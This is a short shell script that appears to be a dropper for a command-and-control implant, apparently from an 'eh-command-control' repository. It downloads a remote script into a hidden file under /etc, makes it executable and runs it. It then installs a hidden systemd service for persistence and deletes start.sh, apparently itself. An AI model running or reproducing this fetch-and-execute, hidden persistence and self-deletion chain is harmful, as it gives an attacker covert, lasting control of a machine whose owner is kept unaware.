curl -sL https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.sh > /etc/.python-logs
chmod +x /etc/.python-logs
python /etc/.python-logs
curl -sL https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.service > /etc/systemd/system/.python-logs.service
rm start.sh
